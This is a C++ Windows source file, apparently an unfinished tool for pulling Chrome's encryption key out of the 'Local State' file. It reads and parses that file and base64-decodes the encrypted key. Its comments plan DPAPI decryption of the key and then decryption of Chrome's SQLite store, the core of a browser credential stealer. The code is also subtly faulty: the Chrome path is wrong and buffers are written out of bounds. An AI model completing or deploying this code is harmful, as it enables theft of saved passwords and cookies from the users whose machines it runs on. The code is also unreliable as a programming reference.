#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <vector>
#include "json.hpp" //Source: https://github.com/nlohmann/json

std::string getChromePath() {
	// Get current user (for the filepath)
	// 256 is max username length (see lmcons.h)
	DWORD bufSize = 256 + 1;
	char* userBuf = (char*) malloc(bufSize);

	if (GetUserNameA(userBuf, &bufSize) == 0) {
		printf("[ERROR] Could not retrieve username.");
	}

	userBuf[bufSize] = '\0';
	// printf("%s\n", userBuf);

	// Get filepath
	std::string filePath = "C:\\Users\\";
	std::string userName = userBuf;
	std::string endPath = "\\AppData\\Local\\Google\\User Data\\Local State";

	filePath.append(userName);
	filePath.append(endPath);

	// printf("%s\n", filePath.c_str());

	return filePath;
}

std::string loadLocalState(std::string chromePath) {
	// Get file handle with CreateFile (doesn't actually create a file, it just opens one)
	HANDLE fileHandle = CreateFileA(
		(LPCSTR) chromePath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING, //Only open if file exists, end process if file does not exist
		FILE_ATTRIBUTE_READONLY,
		NULL);

	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[INFO] No Google Chrome data.\n");
		return "";
	}

	DWORD chromeBufSize = 8192 + 1; // Arbitrary sized buffer, can adjust
	DWORD bytesRead;
	char* chromeContentsBuf = (char*) malloc(chromeBufSize);

	if (!ReadFile(
			fileHandle,
			chromeContentsBuf,
			chromeBufSize,
			&bytesRead,
			NULL)) {
		printf("[ERROR] File could not be read.\n");
		// return "";
	}

	chromeContentsBuf[chromeBufSize] = '\0';

	// Close file handle
	CloseHandle(fileHandle);

	return chromeContentsBuf;
}

std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    std::vector<BYTE> output;

    DWORD confirmSize;

    BOOL bufsizeCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	NULL,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufsizeCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Obtaining the correct size for the buffer failed." << std::endl;
    	return output; //Return empty output
    }

    BYTE* buf = (BYTE*) malloc(confirmSize);

    BOOL bufCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	buf,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Could not copy data." << std::endl;
    	return output; //Return empty output
    }

    // printf("buf:\n");
    // printf("%s\n", buf);

    //Fill output using buf
    std::vector<BYTE> out(buf, buf + confirmSize);
    output = out;

    return output;
}

void decryptDPAPI(std::string decodedKey) {
	//TODO
}

void getAESKEy(std::string chromePath) {

	// Get file "Local State" contents
	std::string localStateContents = loadLocalState(chromePath);
	printf("localStateContents: %s\n", localStateContents.c_str());

	// Parse as JSON
	auto localStateJSON = nlohmann::json::parse(localStateContents.c_str());

	// Get base64 encrypted key
	std::string b64Key = localStateJSON["os_crypt"]["encrypted_key"];

	// Decode using base64
	auto decodedKey = b64Decode(b64Key.c_str());

	// Ignore magic bytes and return
	std::string keyOut(decodedKey.begin() + 5, decodedKey.end());

	return decryptDPAPI(keyOut);
}

int main(int argc, char* argv[]) {
	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
	// "Local State" is the file

	// Get filepath
	std::string chromePath = getChromePath();
	printf("chromePath: %s\n", chromePath.c_str());

	// Get AES key
	getAESKEy(chromePath);

	// getChromeContents(): get contents of JSON file "Local State"

	// JSON file with secret key, encrypted with data protection api (DPAPI)
	// To decrypt:
	// Parse encrypted (symmetric) key
	// Decrypt with DPAPI
	// Decrypt data in SQLite database
}